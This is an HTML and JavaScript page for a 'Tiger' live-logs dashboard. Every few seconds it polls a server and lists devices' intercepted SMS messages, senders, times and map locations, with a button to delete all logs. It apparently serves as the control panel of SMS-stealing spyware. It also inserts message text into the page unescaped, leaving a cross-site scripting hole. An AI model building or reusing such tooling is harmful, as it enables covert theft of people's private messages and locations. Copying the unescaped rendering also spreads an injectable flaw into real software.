<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tiger Secure Dashboard</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a1a; color: #fff; margin: 0; padding: 20px; }
        .container { max-width: 1100px; margin: auto; }
        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #ff4500; padding-bottom: 10px; margin-bottom: 20px; }
        .status-badge { background: #28a745; padding: 5px 10px; border-radius: 5px; font-size: 0.8em; }
        table { width: 100%; border-collapse: collapse; background: #2d2d2d; border-radius: 8px; overflow: hidden; }
        th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid #444; }
        th { background-color: #ff4500; color: white; text-transform: uppercase; font-size: 0.9em; }
        tr:hover { background-color: #3d3d3d; }
        .btn-clear { background: #dc3545; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; transition: 0.3s; }
        .btn-clear:hover { background: #a71d2a; }
        .no-data { text-align: center; padding: 40px; color: #888; }
        .map-link { color: #00d4ff; text-decoration: none; font-weight: bold; border: 1px solid #00d4ff; padding: 3px 8px; border-radius: 4px; font-size: 0.8em; }
        .map-link:hover { background: #00d4ff; color: #000; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🐅 TIGER <span style="color: #ff4500;">LIVE LOGS</span></h1>
            <div>
                <span class="status-badge" id="sync-status">Connected</span>
                <button class="btn-clear" onclick="clearLogs()">Clear All Logs</button>
            </div>
        </div>

        <table>
            <thead>
                <tr>
                    <th>Device</th>
                    <th>Sender</th>
                    <th>Message</th>
                    <th>Time</th>
                    <th>Location</th> </tr>
            </thead>
            <tbody id="log-table-body"></tbody>
        </table>
        <div id="no-data-msg" class="no-data" style="display: none;">No SMS logs found yet...</div>
    </div>

    <script>
        async function fetchLogs() {
            try {
                const response = await fetch('/get-logs');
                const logs = await response.json();
                const tableBody = document.getElementById('log-table-body');
                const noDataMsg = document.getElementById('no-data-msg');

                if (logs.length === 0) {
                    tableBody.innerHTML = '';
                    noDataMsg.style.display = 'block';
                    return;
                }

                noDataMsg.style.display = 'none';
                tableBody.innerHTML = logs.map(log => {
                    // Location link logic
                    const locationHtml = (log.location && log.location !== "Disabled") 
                        ? `<a href="https://www.google.com/maps?q=${log.location}" target="_blank" class="map-link">📍 View Map</a>`
                        : `<span style="color: #666;">No Data</span>`;

                    return `
                        <tr>
                            <td style="color: #ff4500; font-weight: bold;">${log.device}</td>
                            <td>${log.sender}</td>
                            <td>${log.message}</td>
                            <td style="font-size: 0.85em; color: #aaa;">${log.time}</td>
                            <td>${locationHtml}</td> 
                        </tr>
                    `;
                }).join('');
                
                document.getElementById('sync-status').innerText = 'Last Sync: ' + new Date().toLocaleTimeString();
                document.getElementById('sync-status').style.background = '#28a745';
            } catch (error) {
                console.error('Fetch Error:', error);
                document.getElementById('sync-status').innerText = 'Sync Error!';
                document.getElementById('sync-status').style.background = '#dc3545';
            }
        }

        async function clearLogs() {
            if (confirm('Kya aap saare logs delete karna chahte hain?')) {
                await fetch('/clear-logs', { method: 'POST' });
                fetchLogs();
            }
        }

        setInterval(fetchLogs, 5000);
        fetchLogs();
    </script>
</body>
</html>
